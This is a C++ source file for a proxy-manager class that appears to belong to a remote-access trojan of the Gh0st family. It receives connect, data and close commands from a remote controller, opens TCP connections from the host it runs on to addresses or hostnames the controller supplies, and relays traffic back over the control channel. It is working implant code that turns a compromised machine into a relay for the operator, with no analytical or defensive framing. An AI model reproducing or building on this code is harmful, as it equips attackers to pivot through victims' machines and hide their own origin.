// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "ProxyManager.h"
#include <MSTcpIP.h>
#include <TCHAR.h>
#include "stdio.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CProxyManager::CProxyManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = TRUE;
	m_nSend = 0;
	Threads = 0;
	BYTE cmd = TOKEN_PROXY_START;
	Send(&cmd, 1);

}

CProxyManager::~CProxyManager()
{
	if (!m_buser) return;
	m_buser = FALSE;
	Sleep(1500);
	CCriSecLock locallock(m_cs);
	map<DWORD, SOCKET*>::iterator it_oneofserver = list.begin();
	while (it_oneofserver != list.end())
	{
		SOCKET* p_socket = (SOCKET*)(it_oneofserver->second);
		if (p_socket)
		{
			if (*p_socket != INVALID_SOCKET)
			{
				closesocket(*p_socket);
				*p_socket = 0;
			}
			SAFE_DELETE(it_oneofserver->second);
		}
			list.erase(it_oneofserver++);
	}
	while (Threads)
	{
		Sleep(300);
	}
	

}
int CProxyManager::Send(LPBYTE lpData, UINT nSize)
{
	if (!m_buser) return 0;
	int ret;
	ret = CManager::Send(lpData, nSize);
	return ret;
}

void CProxyManager::SendConnectResult(LPBYTE lpBuffer, DWORD ip, USHORT port)
{
	lpBuffer[0] = TOKEN_PROXY_CONNECT_RESULT;
	*(DWORD*)&lpBuffer[5] = ip;
	*(USHORT*)&lpBuffer[9] = port;
	Send(lpBuffer, 11);
}
void CProxyManager::Disconnect(DWORD index)
{
	BYTE buf[5];
	buf[0] = TOKEN_PROXY_CLOSE;
	memcpy(&buf[1], &index, sizeof(DWORD));
	Send(buf, sizeof(buf));
	GetSocket(index,TRUE);
}
void CProxyManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	if (!m_buser) return ;
	switch (lpBuffer[0])
	{
		/*[1]----[4]----[4]----[2]
		cmd		 id		ip		port*/
	case COMMAND_PROXY_CONNECT:
	{
		SocksThreadArg arg;
		arg.pThis = this;
		arg.lpBuffer = lpBuffer;
		Threads++;
		CloseHandle((HANDLE)_beginthreadex(NULL, 0, SocksThread, (LPVOID)&arg, 0, NULL));
		while (arg.lpBuffer)
			Sleep(2);
	}
	break;
	case COMMAND_PROXY_CONNECT_HOSTNAME:
	{
		SocksThreadArg arg;
		arg.pThis = this;
		arg.lpBuffer = lpBuffer;
		arg.len = nSize;
		Threads++;
		CloseHandle((HANDLE)_beginthreadex(NULL, 0, SocksThreadhostname, (LPVOID)&arg, 0, NULL));
		while (arg.lpBuffer)
			Sleep(2);
	}
	break;
	case COMMAND_PROXY_CLOSE:
	{
		 GetSocket(*(DWORD*)&lpBuffer[1],TRUE);
	}
		break;
	case COMMAND_PROXY_DATA:
		DWORD index = *(DWORD*)&lpBuffer[1];
		DWORD nRet, nSend = 5, nTry = 0;
		SOCKET* s = GetSocket(index);
		if (!s) return;
		while (s && (nSend < nSize) && nTry < 15)
		{
			nRet = send(*s, (char*)&lpBuffer[nSend], nSize - nSend, 0);
			if (nRet == SOCKET_ERROR)
			{
				nRet = GetLastError();
				Disconnect(index);
				break;
			}
			else
			{
				nSend += nRet;
			}
			nTry++;
		}
		break;
	}

}
unsigned CProxyManager::SocksThread(LPVOID lparam)
{
	SocksThreadArg* pArg = (SocksThreadArg*)lparam;
	CProxyManager* pThis = pArg->pThis;
	BYTE lpBuffer[11];
	SOCKET* psock=new SOCKET;
	DWORD ip;
	sockaddr_in  sockAddr;
	int nSockAddrLen;
	memcpy(lpBuffer, pArg->lpBuffer, 11);
	pArg->lpBuffer = 0;

	DWORD index = *(DWORD*)&lpBuffer[1];
	//psock = &pThis->m_Socket[index];
	*psock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*psock == SOCKET_ERROR)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		SAFE_DELETE_AR(psock);
		pThis->Threads--;
		return 0;
	}
	ip = *(DWORD*)&lpBuffer[5];
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = *(u_short*)&lpBuffer[9];
	ClientAddr.sin_addr.S_un.S_addr = ip;

	if (connect(*psock, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		SAFE_DELETE_AR(psock);
		pThis->Threads--;
		return 0;
	}

	pThis->list.insert(pair<DWORD, SOCKET*>(index, psock));
	memset(&sockAddr, 0, sizeof(sockAddr));
	nSockAddrLen = sizeof(sockAddr);
	getsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	if (sockAddr.sin_port == 0) sockAddr.sin_port = 1;
	pThis->SendConnectResult(lpBuffer, sockAddr.sin_addr.S_un.S_addr, sockAddr.sin_port);

	ISocketBase* pClient = pThis->m_pClient;
	BYTE* buff = new BYTE[MAX_RECV_BUFFER];
	struct timeval timeout;
	SOCKET socket = *psock;
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(socket, &fdSocket);
	timeout.tv_sec = 0;                //等下select用到这个
	timeout.tv_usec = 10000;
	buff[0] = TOKEN_PROXY_DATA;
	memcpy(buff + 1, &index, 4);
	while (WaitForSingleObject(pClient->m_hEvent, 10) != WAIT_OBJECT_0)
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, &timeout);
		if (nRet == SOCKET_ERROR)
		{
			nRet = GetLastError();
			pThis->Disconnect(index);
			break;
		}
		if (nRet > 0)
		{
			int nSize = recv(socket, (char*)(buff + 5), MAX_RECV_BUFFER - 5, 0);
			if (nSize <= 0)
			{
				pThis->Disconnect(index);
				break;
			}
			if (nSize > 0)
				pThis->Send(buff, nSize + 5);
		}
	}
	SAFE_DELETE_AR(buff);
	FD_CLR(socket, &fdSocket);
	pThis->Threads--;
	return 0;
}
unsigned CProxyManager::SocksThreadhostname(LPVOID lparam)
{
	SocksThreadArg* pArg = (SocksThreadArg*)lparam;
	CProxyManager* pThis = pArg->pThis;
	BYTE* lpBuffer = new BYTE[pArg->len];
	memcpy(lpBuffer, pArg->lpBuffer, pArg->len);
	pArg->lpBuffer = 0;

	DWORD index = *(DWORD*)&lpBuffer[1];
	USHORT nPort = 0;
	memcpy(&nPort, lpBuffer + 5, 2);
	hostent* pHostent = NULL;
	pHostent = gethostbyname((char*)lpBuffer + 7);
	if (!pHostent)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		SAFE_DELETE_AR(lpBuffer);
		return 0;
	}
	SOCKET* psock=new SOCKET;

	sockaddr_in  sockAddr;
	int nSockAddrLen;
	//psock = &pThis->m_Socket[index];
	*psock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*psock == SOCKET_ERROR)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		SAFE_DELETE_AR(lpBuffer);
		SAFE_DELETE_AR(psock);
		pThis->Threads--;
		return 0;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = *(u_short*)&lpBuffer[5];
	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);
	if (connect(*psock, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	{
		pThis->SendConnectResult(lpBuffer, GetLastError(), 0);
		SAFE_DELETE_AR(lpBuffer);
		SAFE_DELETE_AR(psock);
		pThis->Threads--;
		return 0;
	}
	pThis->list.insert(pair<DWORD, SOCKET*>(index, psock));

	memset(&sockAddr, 0, sizeof(sockAddr));
	nSockAddrLen = sizeof(sockAddr);
	getsockname(*psock, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	if (sockAddr.sin_port == 0) sockAddr.sin_port = 1;
	pThis->SendConnectResult(lpBuffer, sockAddr.sin_addr.S_un.S_addr, sockAddr.sin_port);
	SAFE_DELETE_AR(lpBuffer);
	ISocketBase* pClient = pThis->m_pClient;
	BYTE* buff = new BYTE[MAX_RECV_BUFFER];
	struct timeval timeout;
	SOCKET socket = *psock;
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(socket, &fdSocket);
	timeout.tv_sec = 0;                //等下select用到这个
	timeout.tv_usec = 10000;
	buff[0] = TOKEN_PROXY_DATA;
	memcpy(buff + 1, &index, 4);
	while (WaitForSingleObject(pClient->m_hEvent, 10) != WAIT_OBJECT_0)
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, &timeout);
		if (nRet == SOCKET_ERROR)
		{
			nRet = GetLastError();
			pThis->Disconnect(index);
			break;
		}
		if (nRet > 0)
		{
			int nSize = recv(socket, (char*)(buff + 5), MAX_RECV_BUFFER - 5, 0);
			if (nSize <= 0)
			{
				pThis->Disconnect(index);
				break;
			}
			if (nSize > 0)
				pThis->Send(buff, nSize + 5);
		}
	}
	SAFE_DELETE_AR(buff);
	FD_CLR(socket, &fdSocket);
	pThis->Threads--;
	return 0;
}


SOCKET* CProxyManager::GetSocket(DWORD index, BOOL del)
{
	if (!m_buser) return NULL;
	CCriSecLock locallock(m_cs);
	SOCKET* s = list[index];
	if ( del)
	{
		if (!s) return s;
		closesocket(*s);
		SAFE_DELETE(s);
		list.erase(index);
	}

	return s;

}
